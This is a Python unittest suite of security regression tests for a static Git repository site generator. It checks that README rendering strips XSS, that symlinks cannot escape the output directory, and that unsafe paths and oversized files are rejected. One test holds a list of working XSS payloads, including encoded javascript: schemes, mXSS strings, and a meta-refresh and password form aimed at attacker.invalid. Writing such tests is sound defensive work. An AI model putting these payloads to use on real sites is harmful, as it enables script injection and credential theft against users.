#!/usr/bin/env python3
"""Adversarial local security regressions. Fixtures never contact external hosts."""

from html.parser import HTMLParser
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parent))
from readme_assets import ReadmeLinks, link_readme_assets

ROOT = Path(__file__).resolve().parents[1]
BINARY = ROOT / ".cache/cargo/release/sqzer-stagit"
PNG = b"\x89PNG\r\n\x1a\n" + b"image bytes"


def git(repo, *args):
    return subprocess.check_output(["git", "-C", str(repo), *args], stderr=subprocess.PIPE, timeout=60)


def fixture(root, name, files):
    repo = root / name
    repo.mkdir()
    git(repo, "init", "-q", "--initial-branch=main")
    git(repo, "config", "user.name", "Audit <script>alert(1)</script>")
    git(repo, "config", "user.email", "audit@example.invalid")
    for name, content in files.items():
        target = repo / name
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(content if isinstance(content, bytes) else content.encode())
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "Security <img src=x onerror=alert(1)> fixture")
    return repo


def generate(repo, output, success=True):
    result = subprocess.run([BINARY, "--output", output, repo], capture_output=True, timeout=60)
    if success:
        assert result.returncode == 0, result.stderr.decode()
    else:
        assert result.returncode != 0, "Unsafe generation unexpectedly succeeded"
    return result


class Elements(HTMLParser):
    def __init__(self, document):
        super().__init__()
        self.elements = []
        self.feed(document)

    def handle_starttag(self, tag, attributes):
        self.elements.append((tag, dict(attributes)))


class GeneratorTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory(prefix="oni-security-")
        self.root = Path(self.directory.name)

    def tearDown(self):
        self.directory.cleanup()

    def test_markdown_xss_and_metadata_urls(self):
        payloads = [
            '<details><summary>Safe details</summary>Safe text</details>',
            '- [x] Safe task',
            '~~~rust\nlet safe = "<script>";\n~~~',
            '<script>window.__oni_xss=1</script>',
            '<img src=x onerror="window.__oni_xss=2">',
            '<a href="java&#x09;script:alert(1)">encoded scheme</a>',
            '<a href="&#106;avascript:alert(1)">entity scheme</a>',
            '[Markdown](javascript:alert(1))',
            '[data](data:text/html;base64,PHNjcmlwdD4=)',
            '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
            '<base href="https://attacker.invalid/"><meta http-equiv="refresh" content="0;url=https://attacker.invalid">',
            '<form action="https://attacker.invalid"><input type=password name=secret><button formaction="https://attacker.invalid">submit</button></form>',
            '<svg><a xlink:href="javascript:alert(1)"><text>SVG</text></a></svg>',
            '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">',
            '<math><annotation-xml encoding="text/html"><svg><foreignObject><script>alert(1)</script></foreignObject></svg></annotation-xml></math>',
            '<div style="position:fixed;inset:0" id="location" name="constructor">overlay</div>',
        ]
        for number, payload in enumerate(payloads):
            with self.subTest(payload=payload):
                content = "\n\n".join(payloads[:3] + [payload])
                repo = fixture(self.root, f"html-{number}", {"README.md": content})
                (repo / ".git/url").write_text("javascript:alert(7)")
                out = self.root / f"out-{number}"
                generate(repo, out)
                self.check_sanitized((out / "README.html").read_text())

    def check_sanitized(self, document):
        article = document.split('<article class="readme">', 1)[1].split('</article>', 1)[0]
        nodes = Elements(article).elements
        forbidden = {"script", "style", "iframe", "svg", "math", "base", "meta", "form", "button", "object", "embed"}
        self.assertFalse(forbidden & {tag for tag, _ in nodes})
        for tag, attrs in nodes:
            self.assertFalse(any(name.startswith("on") or name in {"style", "srcdoc", "srcset", "id", "name", "action"} for name in attrs))
            for name in ("href", "src"):
                url = attrs.get(name, "")
                self.assertNotIn("javascript:", url.lower())
                self.assertFalse(url.lower().startswith(("data:", "file:", "vbscript:")))
            if tag == "input":
                self.assertEqual(attrs.get("type"), "checkbox")
                self.assertIn("disabled", attrs)
        self.assertIn("details", {tag for tag, _ in nodes})
        self.assertIn('class="language-rust"', article)
        self.assertIn('http-equiv="Content-Security-Policy"', document)
        self.assertNotIn('href="javascript:', document)

    def test_worktree_metadata_and_metadata_links(self):
        repo = fixture(self.root, "metadata", {"README.md": "# Safe"})
        secret = self.root / "private.txt"
        secret.write_text("DO_NOT_PUBLISH_THIS_SENTINEL")
        (repo / "description").symlink_to(secret)
        (repo / "url").symlink_to(secret)
        (repo / ".git/owner").symlink_to(secret)
        (repo / ".git/description").unlink()
        (repo / ".git/description").symlink_to(secret)
        out = self.root / "out"
        generate(repo, out)
        for page in out.rglob("*.html"):
            self.assertNotIn(secret.read_text(), page.read_text())

    def test_output_directory_links_and_file_links(self):
        repo = fixture(self.root, "links", {"README.md": "# Safe", "nested/a.txt": "safe"})
        outside = self.root / "outside"
        outside.mkdir()
        out = self.root / "out"
        out.mkdir()
        (out / "file").symlink_to(outside, target_is_directory=True)
        generate(repo, out, success=False)
        self.assertEqual(list(outside.iterdir()), [])
        (out / "file").unlink()
        secret = outside / "private.txt"
        secret.write_text("unchanged")
        oid = git(repo, "rev-parse", "HEAD").decode().strip()
        (out / "commit").mkdir(exist_ok=True)
        target = out / f"commit/{oid}.html"
        target.symlink_to(secret)
        generate(repo, out)
        self.assertEqual(secret.read_text(), "unchanged")
        self.assertFalse(target.is_symlink())
        alias = self.root / "alias"
        alias.symlink_to(outside, target_is_directory=True)
        generate(repo, alias, success=False)

    def test_nonportable_path_is_rejected(self):
        for number, name in enumerate(("folder\\..\\outside.txt", "file:stream")):
            repo = fixture(self.root, f"path-{number}", {name: "unsafe path"})
            result = generate(repo, self.root / f"out-{number}", success=False)
            self.assertIn(b"unsafe Git file path", result.stderr)

    def test_markdown_and_blob_size_limits(self):
        repo = fixture(self.root, "large-readme", {"README.md": b"x" * (4 * 1024 * 1024 + 1)})
        result = generate(repo, self.root / "readme-out", success=False)
        self.assertIn(b"4 MiB", result.stderr)
        repo = fixture(self.root, "large-blob", {"huge.bin": b"\0" * (32 * 1024 * 1024 + 1)})
        result = generate(repo, self.root / "blob-out", success=False)
        self.assertIn(b"32 MiB", result.stderr)

    def test_active_assets_and_page_boundary(self):
        repo = fixture(self.root, "assets", {
            "README.md": '<img src="good.png"><img src="fake.png"><img src="active.svg"><img src="active.html">\n\n[style source](style.css)',
            "good.png": PNG, "fake.png": "<html><script>alert(1)</script></html>",
            "active.svg": '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
            "active.html": "<script>alert(1)</script>", "style.css": "body {display:none}",
        })
        out = self.root / "out"
        generate(repo, out)
        link_readme_assets(out, repo, {"full_name": "owner/repo", "default_branch": "main"})
        page = (out / "README.html").read_text()
        self.assertIn('rel="stylesheet" href="style.css"', page)
        self.assertIn('href="file/style.css.html"', page)
        self.assertEqual((out / "raw/good.png").read_bytes(), PNG)
        for name in ("fake.png", "active.svg", "active.html"):
            self.assertFalse((out / "raw" / name).exists())
        self.assertIn("https://raw.githubusercontent.com/owner/repo/", page)
        outside = self.root / "external-assets"
        outside.mkdir()
        other = self.root / "other-output"
        other.mkdir()
        (other / "raw").symlink_to(outside, target_is_directory=True)
        parser = ReadmeLinks(other, repo, {"full_name": "owner/repo", "default_branch": "main"})
        try:
            with self.assertRaises(ValueError):
                parser.resolve_link("good.png", True)
        finally:
            parser.close()
        self.assertEqual(list(outside.iterdir()), [])


if __name__ == "__main__":
    unittest.main(verbosity=2)
